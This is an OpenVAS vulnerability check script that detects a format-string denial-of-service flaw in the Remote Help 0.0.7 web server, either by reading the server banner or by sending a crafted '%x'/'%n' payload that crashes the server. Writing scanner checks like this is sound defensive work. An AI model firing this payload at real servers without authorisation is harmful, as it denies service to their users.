###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_remote_help_38875.nasl 14326 2019-03-19 13:40:32Z jschulte $
#
# Remote Help HTTP GET Request Format String Denial Of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100548");
  script_version("$Revision: 14326 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:40:32 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-03-23 13:24:50 +0100 (Tue, 23 Mar 2010)");
  script_bugtraq_id(38875);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Remote Help HTTP GET Request Format String Denial Of Service Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("httpd/banner");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38875");
  script_xref(name:"URL", value:"http://www.corelan.be:8800/index.php/forum/security-advisories/remote-help-httpd-denial-of-service/");
  script_xref(name:"URL", value:"http://www.softpedia.com/get/Internet/Servers/WEB-Servers/Remote-Help.shtml");

  script_tag(name:"summary", value:"Remote Help is prone to a denial-of-service vulnerability.");
  script_tag(name:"impact", value:"Remote attackers can exploit this issue to cause the application to
  crash, denying service to legitimate users. Due to the nature of this
  issue arbitrary code-execution may be possible, however this has not been confirmed.");
  script_tag(name:"affected", value:"Remote Help 0.0.7 is vulnerable, other versions may also be affected.");

  script_tag(name:"qod_type", value:"remote_banner");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");

port = get_http_port(default:80);

if( safe_checks() ) {

  banner = get_http_banner( port:port );
  if( ! banner ) exit( 0 );

  if( "Server: httpd" >!< banner ) exit( 0 );

  version = eregmatch( pattern:"httpd ([0-9.]+)", string:banner );

  if( isnull( version[1] ) ) exit( 0 );

  if( version_is_equal( version:version[1], test_version:"0.0.7 " ) ) {
    security_message( port:port );
    exit( 0 );
  }

  exit( 99 );

} else {

  if( http_is_dead( port:port, retry:4 ) ) exit( 0 );
  banner = get_http_banner( port:port );
  if( "Server: httpd" >!< banner ) exit( 0 );

  data  = crap( data:"%x", length:90 );
  data += crap( data:"A" , length:250 );
  data += crap( data:"%x", length:186 );
  data += crap( data:"%.999999x", length:100 );

  payload = data + string( "%.199999x%nXDCBA" );

  url = string( "/index.html", payload );

  for( i = 0; i < 3; i++ ) {
    req = http_get( item:url, port:port );
    http_send_recv( port:port, data:req, bodyonly:TRUE );
    if( http_is_dead( port:port ) ) {
      security_message( port:port );
      exit( 0 );
    }
    sleep( 2 );
  }

  exit( 99 );

}

exit( 0 );
